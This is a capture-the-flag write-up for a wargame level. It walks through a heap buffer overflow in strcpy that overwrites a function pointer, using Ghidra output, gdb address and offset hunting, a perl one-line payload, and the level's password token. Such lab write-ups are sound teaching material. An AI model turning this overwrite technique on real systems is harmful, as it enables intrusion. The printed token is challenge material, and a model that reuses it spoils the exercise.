# level06

1. Decompilation with Ghidra

    The binary contains:

    ```c
    void main(undefined4 param_1,int param_2)
    {
        char *__dest;
        undefined4 *puVar1;
        
        __dest = (char *)malloc(0x40);
        puVar1 = (undefined4 *)malloc(4);
        *puVar1 = m;
        strcpy(__dest,*(char **)(param_2 + 4));
        (*(code *)*puVar1)();
        return;
    }
    ```

    ```c
    void n(void)
    {
        system("/bin/cat /home/user/level7/.pass");
    }
    ```

    ```c
    void m(void)
    {
        puts("Nope");
    }
    ```

2. Analysis of the vulnerability

    The vulnerability:
    - The function `n()` allows reading the next level's password.
    - Buffer overflow in `strcpy(__dest, argv[1])` allows overwriting the function pointer `*puVar1`.
    - By default, `*puVar1` points to `m()`, but we can overwrite it to point to `n()`.

3. Finding the n() address

    Using gdb to find the `n()` address:

    ```bash
    gdb ./level6

    (gdb) info address n
    Symbol "n" is at 0x08048454
    ```

4. Finding the offset

    We need to find the offset between the two malloc'd buffers:

    ```bash
    gdb -q ./level6
    
    (gdb) disassemble main #to finds the malloc calls
    (gdb) [...]
    (gdb) 0x0804848c <+16>:    call   0x8048350 <malloc@plt>
    (gdb) 0x08048491 <+21>:    mov    %eax,0x1c(%esp) #here
    (gdb) 0x08048495 <+25>:    movl   $0x4,(%esp)
    (gdb) 0x0804849c <+32>:    call   0x8048350 <malloc@plt>
    (gdb) 0x080484a1 <+37>:    mov    %eax,0x18(%esp) #here
    (gdb) [...]

    (gdb) break *0x08048491 #just after malloc
    (gdb) break *0x080484a1 #just after malloc
    (gdb) run AAAA
    
    # At first breakpoint:
    (gdb) print/x $eax
    # Output: 0x0804a008 (addr_dest)
    (gdb) continue
    
    # At second breakpoint:
    (gdb) print/x $eax
    # Output: 0x0804a050 (addr_puVar1)
    (gdb) p/x 0x0804a050 - 0x0804a008
    # Output: 0x48 = 72 bytes
    ```

5. Exploitation

    Build the payload with 72 bytes of padding + address of `n()` in little-endian:

    ```bash
    ./level6 "$(perl -e 'print "A"x72 . "\x54\x84\x04\x08"')"
    
    # Output: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
    ```

6. Token discovered

    The token is: `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`
